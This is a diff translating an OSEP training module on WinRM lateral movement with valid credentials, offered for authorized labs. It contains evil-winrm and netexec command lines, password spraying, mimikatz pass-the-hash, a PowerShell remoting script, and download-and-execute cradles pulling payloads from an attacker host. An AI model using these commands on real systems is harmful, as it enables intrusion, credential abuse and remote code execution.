@@ -2,156 +2,153 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# Module 15 — WinRM
+# Module M15: WinRM lateral movement (valid creds · WinRM only)
 
-If 445 is closed, drop psexec. evil-winrm / netexec on 5985/5986.
-
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> Covers scenarios：56
-> > Prerequisites：已有一组合法凭据（密码 / NTLM 哈希 / Kerberos 票据）；目标 5985（HTTP）或 5986（HTTPS）可达；attacker box为 Kali（含 evil-winrm、netexec、impacket）或一台已控 Windows 跳板
+> Covers scenario: 56
+> > Prerequisites: you already have valid credentials (password / NTLM hash / Kerberos ticket); target 5985 (HTTP) or 5986 (HTTPS) is reachable; attacker box is Kali (evil-winrm, netexec, impacket) or a controlled Windows pivot
 
 ---
 
-## Scenario 56：凭据有效，但目标只开放 WinRM
+## Scenario 56: Credentials work, but the target only exposes WinRM
 
-**Situation**：身份是对的，但 SMB（445）不通——凡依赖 SMB 的横移执行手段（PsExec、WMIC、smbexec、经 `admin$` 放文件再触发计划任务等）全部报废；目标仅暴露 WinRM 管理端口，要用 WinRM 会话完成执行与后续横向。
+**Situation**: The identity is correct, but SMB (445) is closed — every lateral execution path that depends on SMB (PsExec, WMIC, smbexec, copy via `admin$` then schtasks, etc.) is dead; the target only exposes WinRM management ports. Use a WinRM session for execution and further lateral movement.
 
-**Assumptions**：
-- 我方已持有：`USER` + `PASS`（明文），或 `USER` + `NTHASH`（NTLM 哈希），或目标域内 Kerberos 票据（ccache/TGT）。
-- 目标侧：5985/5986 监听（`winrm` 服务）；该账户属于目标本地 `Administrators` 或 `Remote Management Users`（WinRM 默认只允许这两组）。域环境下还要确认用户有target本地权限，而不只是域内合法用户。
-- 网络：Kali→目标 5985/5986 通；目标到 Kali 的 445/139 不通（否则不需要走本场景）。若在多层跳板后，先保证端口转发/代理可达 5985/5986。
-- 必须放弃的执行方法（**SMB 不通即失效，别浪费时间**）：`psexec.py`/PsExec、`wmiexec.py`/WMIC（多数实现要写 `admin$`）、`smbexec.py`、SMB 中继、经 SMB 复制脚本文件再 `schtasks`/`sc` 触发、`admin$` 放 PowerShell 脚本。
+**Assumptions**:
+- You hold: `USER` + `PASS` (plaintext), or `USER` + `NTHASH` (NTLM hash), or a domain Kerberos ticket (ccache/TGT).
+- Target side: 5985/5986 listening (`winrm` service); the account is in local `Administrators` or `Remote Management Users` (WinRM’s default allow-list). In a domain, also confirm the user has **local** rights on the target — domain membership alone is not enough.
+- Network: Kali→target 5985/5986 open; target→Kali 445/139 closed (otherwise this scenario is unnecessary). After multi-hop pivots, ensure port-forward/proxy reaches 5985/5986 first.
+- Methods to abandon (**SMB closed = they fail; do not waste time**): `psexec.py`/PsExec, `wmiexec.py`/WMIC (most implementations write `admin$`), `smbexec.py`, SMB relay, copy scripts over SMB then `schtasks`/`sc`, drop PowerShell via `admin$`.
 
-**Prepare (attacker)**：
-1. Kali 确认工具存在：
+**Prepare (attacker)**:
+1. Confirm Kali tools:
    ```bash
    which evil-winrm netexec 2>/dev/null
-   gem list winrm 2>/dev/null | head -3    # evil-winrm 依赖 winrm gem
+   gem list winrm 2>/dev/null | head -3    # evil-winrm depends on winrm gem
    ```
-   evil-winrm 缺失时：`sudo gem install evil-winrm`（Kali 一般自带；也可用 apt 包 `evil-winrm`）。netexec 是 crackmapexec 的接替者（Kali 上 `netexec`），两者命令都给出。
-2. 端口连通性确认（先于认证排错）：
+   If evil-winrm is missing: `sudo gem install evil-winrm` (often preinstalled on Kali; apt package `evil-winrm` also works). netexec succeeds crackmapexec on Kali (`netexec`); both command forms are given below.
+2. Port reachability (before auth troubleshooting):
    ```bash
-   nc -nvz TARGET 5985; nc -nvz TARGET 5986    # 任一开即可
+   nc -nvz TARGET 5985; nc -nvz TARGET 5986    # either open is enough
    ```
-   HTTPS（5986）场景需 `evil-winrm -S`，并把自签证书问题放后面处理。
-3. 若走 Kerberos：准备 `/etc/hosts` 或可解析的 `DOMAIN` 域名、确认能到 KDC（TCP/88）、校时（`ntpdate`/`chronyd`，票据对时钟漂移极敏感，>5 分钟即失败）。
-4. 准备好会话内后续载荷（WinRM 会话本身就是执行通道，多数情况无需落地文件）：
-   - PowerShell 内存下载执行（IEX cradles）；
-   - 需要落地时走目标自己的出网下载（certutil/BITS），而不是 SMB 回拷。
+   HTTPS (5986) needs `evil-winrm -S`; handle self-signed certs later.
+3. For Kerberos: prepare `/etc/hosts` or resolvable `DOMAIN` names, reachability to KDC (TCP/88), time sync (`ntpdate`/`chronyd` — tickets fail hard on clock skew >5 minutes).
+4. Prepare in-session follow-on payloads (WinRM itself is the execution channel; usually no need to drop files):
+   - PowerShell in-memory download/exec (IEX cradles);
+   - If a file is required, have the target download outbound itself (certutil/BITS), not SMB pull-back.
 
-**Procedure**：
+**Procedure**:
 
-1. **判断该账户在目标上是否有 WinRM 权限**（顺便确认凭据本身有效）：
+1. **Check whether the account has WinRM rights on the target** (also validates the creds):
    ```bash
-   # 明文
+   # plaintext
    netexec winrm TARGET -u USER -p 'PASS'
-   # 哈希（Pass-the-Hash over NTLM）
+   # hash (Pass-the-Hash over NTLM)
    netexec winrm TARGET -u USER -H NTHASH
-   # 域环境带域名（-d 后接 DOMAIN）
+   # domain account with -d DOMAIN
    netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
    ```
-   期望输出：`[+] TARGET:5985 - ... (Pwn3d!)`。`(Pwn3d!)` 表示该账户在本地管理员组；没有该标记但仍能认证时，命令可能仍可执行（Remote Management Users 非管理员也能跑 WinRM），下面步骤 3 会真正Verify。
-2. **（备选批量）多目标/喷密码**：见 cheat sheet `WinRM password spraying`/`Multiple targets with WinRM`：
+   Expected: `[+] TARGET:5985 - ... (Pwn3d!)`. `(Pwn3d!)` means local admin. Auth without that marker can still allow command execution (Remote Management Users need not be admins) — step 3 verifies for real.
+2. **(Optional batch) multi-target / spray**: cheat sheet `WinRM password spraying` / `Multiple targets with WinRM`:
    ```bash
    netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
    ```
-3. **用 evil-winrm 拿会话（明文或哈希两条线）**：
+3. **evil-winrm session (plaintext or hash)**:
    ```bash
-   # 明文（HTTP）
+   # plaintext (HTTP)
    evil-winrm -i TARGET -u USER -p 'PASS'
-   # 明文 + 域名（NTLM 时一般不需要，Kerberos 时需要 -r）
+   # plaintext + domain (usually unnecessary for NTLM; Kerberos needs -r)
    evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
-   # NTLM 哈希（Pass-the-Hash）
+   # NTLM hash (Pass-the-Hash)
    evil-winrm -i TARGET -u USER -H NTHASH
    # HTTPS
    evil-winrm -i TARGET -u USER -p 'PASS' -S
    ```
-   进入后提示符为 `*Evil-WinRM* PS C:\...>`，先跑 `whoami` 与 `whoami /priv` 确认身份。
-4. **Kerberos 认证线（域环境、无明文密码但有票据/想避免 NTLM 日志时）**：
-   前置：目标主机名解析（`/etc/hosts` 加 `TARGET-IP  target.dom`）、拿到该账户 TGT：
+   Prompt becomes `*Evil-WinRM* PS C:\...>`; run `whoami` and `whoami /priv` first.
+4. **Kerberos auth path** (domain; no plaintext, or avoid NTLM logs):
+   Prerequisites: resolvable hostname (`/etc/hosts` entry `TARGET-IP  target.dom`), TGT for the account:
    ```bash
-   # 用密码换 TGT（ccache）
+   # password → TGT (ccache)
    impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
    export KRB5CCNAME=$(pwd)/USER.ccache
-   # 或已有票据时直接导出
+   # or reuse an existing ticket
    netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache
    ```
-   evil-winrm 对 Kerberos 支持弱（依赖环境变量），Kerberos 会话推荐两条替代：
-   - 从已控 **Windows 跳板**：`Enter-PSSession -ComputerName TARGET -Credential ...` 用 Kerberos 默认认证；
-   - Kali 上 `netexec winrm ... -k`（配合 `KRB5CCNAME`）。
-   Kerberos 失败先查：域名解析、时钟漂移、SPN `http/target.dom` 是否存在、票据是否过期。
-5. **会话内确认可执行命令**（认证成功 ≠ 能执行，非管理员 Remote Management Users 可能被语言模式/执行策略限制）：
+   evil-winrm’s Kerberos support is weak (env-dependent). Prefer:
+   - From a controlled **Windows pivot**: `Enter-PSSession -ComputerName TARGET -Credential ...` (Kerberos by default);
+   - On Kali: `netexec winrm ... -k` with `KRB5CCNAME`.
+   Kerberos failures: name resolution, clock skew, SPN `http/target.dom`, ticket expiry.
+5. **Confirm in-session command execution** (auth ≠ execute; non-admin Remote Management Users may hit language mode / execution policy limits):
    ```powershell
    whoami
    [Environment]::Is64BitOperatingSystem
-   Get-ExecutionPolicy -List          # 只影响脚本文件，不影响交互命令
+   Get-ExecutionPolicy -List          # affects script files, not interactive commands
    ```
-6. **会话内投放后续 payload（无 SMB 时的两条通道）**：
-   - **内存执行（首选，不落盘）**：
+6. **Deliver follow-on payload in-session (two channels when SMB is closed)**:
+   - **In-memory (preferred, no disk)**:
      ```powershell
-     # attacker box起 HTTP 投递： python3 -m http.server 80
+     # attacker HTTP: python3 -m http.server 80
      IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
-     # 或下载到内存再 Invoke-Expression；需要传参时用脚本块包装
+     # or download to memory then Invoke-Expression; wrap in a scriptblock when args are needed
      ```
-     evil-winrm 的 `scripts/` 与 `loot/` 只是本地目录，上传/下载走 WinRM 协议本身（`upload`/`download` 命令），不依赖 SMB。
-   - **落地执行（确需文件时，从目标自己出网下载）**：
+     evil-winrm `scripts/` and `loot/` are local directories only; upload/download use the WinRM protocol (`upload`/`download` commands) — no SMB.
+   - **On-disk (only if a file is required; target downloads itself)**:
      ```powershell
      certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
-     # 备选： BITSAdmin / Start-BitsTransfer / powershell -c (New-Object Net.WebClient)
+     # alternatives: BITSAdmin / Start-BitsTransfer / powershell -c (New-Object Net.WebClient)
      ```
-     禁止假设能经 `\\LHOST\share` 拉文件——SMB 不通是本场景的前提。
-7. **（Windows 跳板线）不用 evil-winrm，直接在已控 Windows 上 PowerShell Remoting**：
+     Do **not** assume `\\LHOST\share` works — closed SMB is the premise of this scenario.
+7. **(Windows pivot path) skip evil-winrm; PowerShell Remoting from a controlled Windows host**:
    ```powershell
-   # 交互单命令
+   # single interactive command
    winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
-   # 或 PSSession（先允许凭据）
+   # or PSSession
    $pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
    $c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER',$pw)
    $s  = New-PSSession -ComputerName TARGET -Credential $c
    Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
-   # 会话内再起反向连接 / 投放同上面第 6 步
+   # then reverse shell / same delivery as step 6
    ```
-   `winrs`/WinRM 客户端在 Windows 10/Server 2016+ 默认存在；被管理端需已启用 PS-Remoting（考试靶机开 WinRM 端口即视为已启用）。
+   `winrs`/WinRM client is built into Windows 10/Server 2016+; managed hosts with WinRM ports open are treated as PS-Remoting enabled in the exam.
 
-**Lab files**：
-| 脚本 | 用途 | 关键参数 |
+**Scripts used**:
+| Script | Purpose | Key params |
 |---|---|---|
-| `m15-winrm-auth-matrix.ps1` | 明文/哈希/Kerberos 三模板 + 失败排查清单（PowerShell Remoting 线） | `-Target`、`-User`、`-Pass`/`-NtHash`、`-Domain` |
-| `m15-winrm-lateral.md` | evil-winrm / netexec 命令速查 + 会话内 payload 投放备忘 | — |
+| `m15-winrm-auth-matrix.ps1` | Plaintext/hash/Kerberos templates + failure checklist (PowerShell Remoting path) | `-Target`, `-User`, `-Pass`/`-NtHash`, `-Domain` |
+| `m15-winrm-lateral.md` | evil-winrm / netexec cheat sheet + in-session payload notes | — |
 
 #### `m15-winrm-auth-matrix.ps1` {#m15-winrm-auth-matrix-ps1}
 
 ````powershell
 <#
-# 用途：WinRM 横移的 PowerShell Remoting 认证三模板（明文 / NTLM 哈希 / Kerberos）
-#       一次调用完成：端口预检 -> 建 PSSession -> 单发命令或进交互会话；失败时输出排查方向。
-# 场景：56（SMB 不通仅 WinRM 开放；Windows 跳板线，Linux 线见 m15-winrm-lateral.md）
-# 依赖：Windows 10/Server 2016+ 自带；无第三方模块。
-#       - 哈希线若走 mimikatz pth，需自行准备 mimikatz.exe（-Mimikatz 参数给路径）。
-# 使用：
+# Purpose: WinRM lateral PowerShell Remoting auth templates (plaintext / NTLM hash / Kerberos)
+#          One call: port precheck -> New-PSSession -> one-shot command or interactive session;
+#          on failure, print triage directions.
+# Scenario: 56 (SMB closed, WinRM only; Windows pivot path — Linux path in m15-winrm-lateral.md)
+# Depends: Windows 10/Server 2016+ built-in; no third-party modules.
+#          Hash path via mimikatz pth needs mimikatz.exe (-Mimikatz path).
+# Usage:
 #   .\m15-winrm-auth-matrix.ps1 -Target TARGET -User USER -Pass 'PASS' [-Domain DOMAIN] [-Interactive]
-#   .\m15-winrm-auth-matrix.ps1 -Target TARGET -User USER -NtHash NTHASH             # 哈希线指引见输出
-#   .\m15-winrm-auth-matrix.ps1 -Target TARGET.fqdn -User DOMAIN\USER -Kerberos      # 用当前票据走 Kerberos
-# 占位符：TARGET=目标IP/主机名  USER=用户名  PASS=明文密码  NTHASH=NTLM哈希(32hex)
-#         DOMAIN=AD域名（可选，用于构造 DOMAIN\USER）
-# 测试状态：本机仅做语法级自检（PowerShell parser）；未在真实域/靶机实测，
-#           需在 OSEP 实验网按上表逐行验证。
-# 关键事实：New-PSSession 只收明文密码；NTLM 哈希无原生 PTH，替代指引见 -NtHash 分支。
+#   .\m15-winrm-auth-matrix.ps1 -Target TARGET -User USER -NtHash NTHASH             # hash guidance in output
+#   .\m15-winrm-auth-matrix.ps1 -Target TARGET.fqdn -User DOMAIN\USER -Kerberos      # current ticket
+# Placeholders: TARGET=IP/hostname  USER=username  PASS=password  NTHASH=NTLM hash (32 hex)
+#               DOMAIN=AD domain (optional, builds DOMAIN\USER)
+# Test status: local syntax check only (PowerShell parser); not live-tested on a real domain/lab —
+#              verify line-by-line in the OSEP lab network.
+# Hard fact: New-PSSession only accepts plaintext; no native NTLM PTH — see -NtHash branch.
 #>
 
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory = $true)][string]$Target,          # 目标 IP 或 FQDN
-    [Parameter(Mandatory = $true)][string]$User,            # 用户名（可带 DOMAIN\ 前缀）
-    [string]$Pass,                                          # 明文密码
-    [string]$NtHash,                                        # NTLM 哈希（32 位 hex）
-    [string]$Domain,                                        # 可选 AD 域名
-    [switch]$Kerberos,                                      # 用 Kerberos 认证（需域环境）
-    [switch]$Interactive,                                   # 进入交互 Enter-PSSession
-    [switch]$UseSSL,                                        # 目标 5986（HTTPS）
-    [string]$Command = 'whoami; hostname',                  # 默认单发命令
-    [string]$Mimikatz                                       # 哈希线 mimikatz.exe 路径（可选）
+    [Parameter(Mandatory = $true)][string]$Target,          # target IP or FQDN
+    [Parameter(Mandatory = $true)][string]$User,            # username (may include DOMAIN\ prefix)
+    [string]$Pass,                                          # plaintext password
+    [string]$NtHash,                                        # NTLM hash (32 hex)
+    [string]$Domain,                                        # optional AD domain
+    [switch]$Kerberos,                                      # Kerberos auth (domain)
+    [switch]$Interactive,                                   # Enter-PSSession
+    [switch]$UseSSL,                                        # target 5986 (HTTPS)
+    [string]$Command = 'whoami; hostname',                  # default one-shot
+    [string]$Mimikatz                                       # optional mimikatz.exe path for hash path
 )
 
 $ErrorActionPreference = 'Stop'
@@ -160,43 +157,43 @@ function Write-Step($msg)  { Write-Host "[*] $msg" -ForegroundColor Cyan }
 function Write-Ok($msg)    { Write-Host "[+] $msg" -ForegroundColor Green }
 function Write-Fail($msg)  { Write-Host "[-] $msg" -ForegroundColor Red }
 
-# ---------- 0. 参数互斥校验 ----------
+# ---------- 0. Mutual-exclusion checks ----------
 if (-not $Pass -and -not $NtHash -and -not $Kerberos) {
-    Write-Fail "必须提供三种凭据形态之一：-Pass 明文 / -NtHash 哈希 / -Kerberos（用当前票据）。"
+    Write-Fail "Provide one credential form: -Pass plaintext / -NtHash hash / -Kerberos (current ticket)."
     exit 1
 }
 if ($Pass -and $NtHash) {
-    Write-Fail "-Pass 与 -NtHash 同时给出，二选一。"
+    Write-Fail "-Pass and -NtHash both set; pick one."
     exit 1
 }
-if ($Domain) { $User = "$Domain\$User" }   # 统一成 DOMAIN\User（无 Domain 时保持原名/.\ 本地）
+if ($Domain) { $User = "$Domain\$User" }   # normalize to DOMAIN\User (keep .\USER when no Domain)
 
-# ---------- 1. 端口预检（SMB 不通是本场景前提，别在 445 上浪费时间） ----------
-Write-Step "检查目标 WinRM 端口 5985/5986 ..."
+# ---------- 1. Port precheck (SMB closed is the premise — do not burn time on 445) ----------
+Write-Step "Checking target WinRM ports 5985/5986 ..."
 $http  = Test-NetConnection -ComputerName $Target -Port 5985 -WarningAction SilentlyContinue
 $https = Test-NetConnection -ComputerName $Target -Port 5986 -WarningAction SilentlyContinue
 if (-not $http.TcpTestSucceeded -and -not $https.TcpTestSucceeded) {
-    Write-Fail "5985 与 5986 均不可达。先确认端口真的开了（nmap -Pn -p5985,5986），
-    或本脚本所在跳板到目标的 5985/5986 需要先做端口转发（见模块 M08 隧道）。"
+    Write-Fail "Neither 5985 nor 5986 reachable. Confirm ports (nmap -Pn -p5985,5986),
+    or port-forward 5985/5986 from this pivot first (see module M08 tunneling)."
     exit 1
 }
 if ($UseSSL -and -not $https.TcpTestSucceeded) {
-    Write-Fail "-UseSSL 要求 5986 开放，但 5986 不可达。去掉 -UseSSL 改走 5985。"
+    Write-Fail "-UseSSL requires 5986, but 5986 is unreachable. Drop -UseSSL and use 5985."
     exit 1
 }
-if (-not $UseSSL -and -not $http.TcpTestSucceeded) { $UseSSL = $true }  # 只有 5986 时自动切 HTTPS
-Write-Ok "端口可达（5985=$($http.TcpTestSucceeded) 5986=$($https.TcpTestSucceeded)），使用 $($(if($UseSSL){'HTTPS'}else{'HTTP'}))。"
+if (-not $UseSSL -and -not $http.TcpTestSucceeded) { $UseSSL = $true }  # auto HTTPS if only 5986
+Write-Ok "Ports reachable (5985=$($http.TcpTestSucceeded) 5986=$($https.TcpTestSucceeded)), using $($(if($UseSSL){'HTTPS'}else{'HTTP'}))."
 
-# ---------- 2. 认证形态分发 ----------
+# ---------- 2. Auth form dispatch ----------
 $sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60
 if ($UseSSL) { $sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60 -SkipCACheck -SkipCNCheck }
 
 $cred = $null
 if ($Pass) {
-    # --- 模板 A：明文密码（最稳，New-PSSession 原生支持） ---
+    # --- Template A: plaintext (most reliable; native New-PSSession) ---
     $secure = ConvertTo-SecureString $Pass -AsPlainText -Force
     $cred = New-Object System.Management.Automation.PSCredential($User, $secure)
-    Write-Step "模板 A：明文密码认证 $User @ $Target"
+    Write-Step "Template A: plaintext auth $User @ $Target"
     $params = @{
         ComputerName  = $Target
         Credential    = $cred
@@ -204,31 +201,31 @@ if ($Pass) {
         ErrorAction   = 'Stop'
     }
     if ($UseSSL)  { $params.UseSSL = $true }
-    if ($Kerberos){ $params.Authentication = 'Kerberos' }   # 域内可选：显式走 Kerberos
+    if ($Kerberos){ $params.Authentication = 'Kerberos' }   # optional explicit Kerberos in-domain
 }
 elseif ($NtHash) {
-    Write-Step "模板 B：NTLM 哈希 $User @ $Target"
+    Write-Step "Template B: NTLM hash $User @ $Target"
     if ($Mimikatz -and (Test-Path $Mimikatz)) {
-        Write-Step "用 mimikatz sekurlsa::pth 注入哈希，再在提升后的进程里重跑本脚本（不带 -NtHash）或直接 winrs："
+        Write-Step "Inject hash with mimikatz sekurlsa::pth, then re-run this script without -NtHash (or winrs) in the elevated process:"
         Write-Host ("    {0} ""sekurlsa::pth /user:{1} /domain:{2} /ntlm:{3} /run:powershell.exe""" -f `
             $Mimikatz, $User.Split('\')[-1], $(if($User.Contains('\')){$User.Split('\')[0]}else{'.'}), $NtHash)
-        Write-Ok  "PTH 成功后，在新开的 powershell 里执行：winrs -r:$Target whoami ，或本脚本改用 -Pass 前的当前令牌。"
+        Write-Ok  "After PTH succeeds, in the new powershell: winrs -r:$Target whoami — or this script using the current token (no -Pass)."
     }
     else {
-        Write-Host "[!] Windows 侧没有原生 NTLM-PTH-over-WinRM。两个替代（任选）："
-        Write-Host "    1) Linux 线（推荐）：evil-winrm -i $Target -u $User -H $NtHash （见 m15-winrm-lateral.md）"
-        Write-Host "    2) Windows 线：mimikatz sekurlsa::pth /user:$($User.Split('\')[-1]) /ntlm:$NtHash /run:powershell.exe，"
-        Write-Host "       然后在新进程里 winrs -r:$Target whoami（令牌里已有哈希，走 NTLM 认证）。"
+        Write-Host "[!] Windows has no native NTLM-PTH-over-WinRM. Two alternatives:"
+        Write-Host "    1) Linux path (recommended): evil-winrm -i $Target -u $User -H $NtHash (see m15-winrm-lateral.md)"
+        Write-Host "    2) Windows path: mimikatz sekurlsa::pth /user:$($User.Split('\')[-1]) /ntlm:$NtHash /run:powershell.exe,"
+        Write-Host "       then in the new process: winrs -r:$Target whoami (token already holds the hash; NTLM auth)."
     }
-    exit 0   # 哈希线不由本脚本直接建会话，避免给出跑不通的"假模板"
+    exit 0   # hash path does not build a session here — avoid a fake template that cannot work
 }
 elseif ($Kerberos) {
-    Write-Step "模板 C：Kerberos 认证 $User @ $Target"
+    Write-Step "Template C: Kerberos auth $User @ $Target"
     if ($Target -notmatch '\.') {
-        Write-Fail "Kerberos 需要 FQDN：-Target 请给 target.dom 而不是纯 IP（SPN http/target.dom 解析依赖它）。"
+        Write-Fail "Kerberos needs FQDN: -Target must be target.dom, not a bare IP (SPN http/target.dom depends on it)."
         exit 1
     }
-    # 说明：带 -Pass 的 Kerberos 走模板 A（A 里已按 -Kerberos 显式设 Authentication）；此处只处理当前票据形态
+    # Kerberos with -Pass goes through template A (Authentication already set). Here: current-ticket only.
     $params = @{
         ComputerName  = $Target
         Authentication = 'Kerberos'
@@ -239,34 +236,34 @@ elseif ($Kerberos) {
     if ($cred)    { $params.Credential = $cred }
 }
 
-# ---------- 3. 建会话 + 单发命令 / 交互 ----------
+# ---------- 3. Session + one-shot / interactive ----------
 try {
     $session = New-PSSession @params
-    Write-Ok "PSSession 建立成功：$($session.ComputerName)  State=$($session.State)"
+    Write-Ok "PSSession OK: $($session.ComputerName)  State=$($session.State)"
 }
 catch {
-    Write-Fail "New-PSSession 失败：$($_.Exception.Message)"
-    Write-Host "==== 失败排查（按顺序核对） ===="
-    Write-Host "1) 认证类 'Access is denied'/401：账户是否在目标 Administrators 或 Remote Management Users？域账户查 -Domain 拼写，本机账户用 .\USER。"
-    Write-Host "2) 连接类：跳板到 5985/5986 是否需隧道？客户端 WinRM 服务先 Get-Service WinRM; Start-Service WinRM（0x803381xx 同此）。"
-    Write-Host "3) HTTPS 证书：已自动加 -SkipCACheck/-SkipCNCheck；仍失败确认 5986 真是 WinRM。"
-    Write-Host "4) Kerberos KRB_AP_ERR_*：FQDN 解析、时钟(<5min)、SPN http/目标FQDN 是否存在。"
+    Write-Fail "New-PSSession failed: $($_.Exception.Message)"
+    Write-Host "==== Failure triage (check in order) ===="
+    Write-Host "1) Auth 'Access is denied'/401: is the account in Administrators or Remote Management Users? Domain spelling via -Domain; local accounts use .\USER."
+    Write-Host "2) Connectivity: does the pivot need a tunnel to 5985/5986? Client WinRM: Get-Service WinRM; Start-Service WinRM (0x803381xx same)."
+    Write-Host "3) HTTPS certs: -SkipCACheck/-SkipCNCheck already applied; still failing → confirm 5986 really is WinRM."
+    Write-Host "4) Kerberos KRB_AP_ERR_*: FQDN resolution, clock (<5min), SPN http/<target FQDN>."
     exit 1
 }
 
 if ($Interactive) {
-    Write-Step "进入交互会话（输入 exit 退出）..."
+    Write-Step "Entering interactive session (type exit to leave)..."
     Enter-PSSession -Session $session
     Remove-PSSession $session
 }
 else {
-    Write-Step "执行命令：$Command"
+    Write-Step "Running command: $Command"
     try {
         Invoke-Command -Session $session -ScriptBlock ([scriptblock]::Create($Command))
-        Write-Ok "命令执行完成。"
+        Write-Ok "Command finished."
     }
     catch {
-        Write-Fail "命令执行失败：$($_.Exception.Message)（认证成功≠可执行；Remote Management Users 非管理员可能受限，改试 cmd /c whoami）"
+        Write-Fail "Command failed: $($_.Exception.Message) (auth ≠ execute; non-admin Remote Management Users may be limited — try cmd /c whoami)"
     }
     Remove-PSSession $session
 }
@@ -275,200 +272,200 @@ else {
 #### `m15-winrm-lateral.md` {#m15-winrm-lateral-md}
 
 ````markdown
-# m15 · WinRM 横移命令速查（Kali / evil-winrm / netexec 线）
+# m15 · WinRM lateral cheat sheet (Kali / evil-winrm / netexec)
 
-> 场景 56：凭据有效、SMB 不通、仅 5985/5986 开放。本文是 Linux 攻击机一侧的速查；
-> Windows 跳板一侧的模板见 `m15-winrm-auth-matrix.ps1`。
-> 占位符：`TARGET`(IP/FQDN) `DOMAIN` `USER` `PASS` `NTHASH` `LHOST` `LPORT` `PAYLOAD` `URL`
+> Scenario 56: valid creds, SMB closed, only 5985/5986 open. Linux attacker side;
+> Windows pivot templates are in `m15-winrm-auth-matrix.ps1`.
+> Placeholders: `TARGET`(IP/FQDN) `DOMAIN` `USER` `PASS` `NTHASH` `LHOST` `LPORT` `PAYLOAD` `URL`
 
-## 1. 先判定（30 秒内决定路线）
+## 1. Decide the path (≈30 seconds)
 
 ```bash
-nmap -Pn -p445,5985,5986 TARGET          # 445 不通才走本文；5985/5986 至少一个开
+nmap -Pn -p445,5985,5986 TARGET          # only use this doc when 445 is closed; need 5985 or 5986
 nc -nvz TARGET 5985; nc -nvz TARGET 5986
 ```
 
-## 2. 认证 + 权限探测
+## 2. Auth + rights probe
 
 ```bash
-# 明文
+# plaintext
 netexec winrm TARGET -u USER -p 'PASS'
-# NTLM 哈希（Pass-the-Hash）
+# NTLM hash (Pass-the-Hash)
 netexec winrm TARGET -u USER -H NTHASH
-# 域账户带域名
+# domain account
 netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
-# 多目标批量（慎用，防锁账户）
+# multi-target batch (careful — lockout risk)
 netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
 ```
 
-- `(Pwn3d!)` = 账户在目标本地管理员组 → 命令执行基本无障碍。
-- 只有 `[+]` 无 `(Pwn3d!)` = 认证通过但非管理员；仍可能有 Remote Management Users 权限，进会话验证。
+- `(Pwn3d!)` = local admin on the target → command execution usually unconstrained.
+- `[+]` without `(Pwn3d!)` = auth OK but not admin; may still be Remote Management Users — enter a session to verify.
 
-## 3. 交互会话（evil-winrm）
+## 3. Interactive session (evil-winrm)
 
 ```bash
-# 明文 HTTP（5985）
+# plaintext HTTP (5985)
 evil-winrm -i TARGET -u USER -p 'PASS'
-# 域内显式域名
+# explicit domain
 evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
-# NTLM 哈希
+# NTLM hash
 evil-winrm -i TARGET -u USER -H NTHASH
-# HTTPS（5986）
+# HTTPS (5986)
 evil-winrm -i TARGET -u USER -p 'PASS' -S
-# 指定脚本/字典目录（本机路径，仅本地使用）
+# local scripts/dict dirs (local paths only)
 evil-winrm -i TARGET -u USER -p 'PASS' -s /opt/evil-winrm/scripts
 ```
 
-会话内基本操作：
+In-session basics:
 
 ```text
 *Evil-WinRM* PS> whoami ; whoami /priv
-*Evil-WinRM* PS> upload ./PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe   # 走 WinRM 通道，不依赖 SMB
+*Evil-WinRM* PS> upload ./PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe   # WinRM channel; no SMB
 *Evil-WinRM* PS> download C:\Windows\Temp\result.txt ./result.txt
-*Evil-WinRM* PS> menu          # 列出内置功能（services/reg/loot 等）
+*Evil-WinRM* PS> menu          # built-ins (services/reg/loot, …)
 ```
 
-> 注意：evil-winrm 的 `menu` 里 `services`/`reg` 走其内置实现；抓密码类长任务建议一行命令执行并即时抄输出。
+> Note: evil-winrm `menu` `services`/`reg` use its built-ins; for long password-dump jobs prefer one-liners and copy output immediately.
 
-## 4. Kerberos 线（域环境；无 SMB 也可，需票据/域名/时钟三前置）
+## 4. Kerberos path (domain; works without SMB; needs ticket/DNS/clock)
 
 ```bash
-# 前置：可解析 FQDN + 校时
+# Prerequisites: resolvable FQDN + time sync
 echo "TARGET-IP  target.dom" >> /etc/hosts
-sudo ntpdate DC_IP || chronyc makestep     # 与 DC 时钟差 <5 分钟
+sudo ntpdate DC_IP || chronyc makestep     # clock skew vs DC <5 minutes
 
-# 用密码换 TGT（ccache），或已有 .ccache 直接用
+# password → TGT (ccache), or reuse an existing .ccache
 impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
 export KRB5CCNAME=$(pwd)/USER.ccache
 
-# 用票据认证（注意 -Target 要 FQDN）
+# ticket auth (Target must be FQDN)
 netexec winrm target.dom -d DOMAIN -u USER -k --use-kcache
 ```
 
-- evil-winrm 对 Kerberos 支持弱；Kerberos 交互建议从 Windows 跳板 `Enter-PSSession -Authentication Kerberos`（见 m15-winrm-auth-matrix.ps1 模板 C）。
-- Kerberos 报 `KRB_AP_ERR_MODIFIED` / `KDC_ERR_*`：先查 `/etc/hosts`、时钟、`klist` 票据是否过期，再查 SPN：`impacket-GetUserSPNs` 或 `ldapsearch`。
+- evil-winrm Kerberos support is weak; for interactive Kerberos prefer Windows pivot `Enter-PSSession -Authentication Kerberos` (template C in m15-winrm-auth-matrix.ps1).
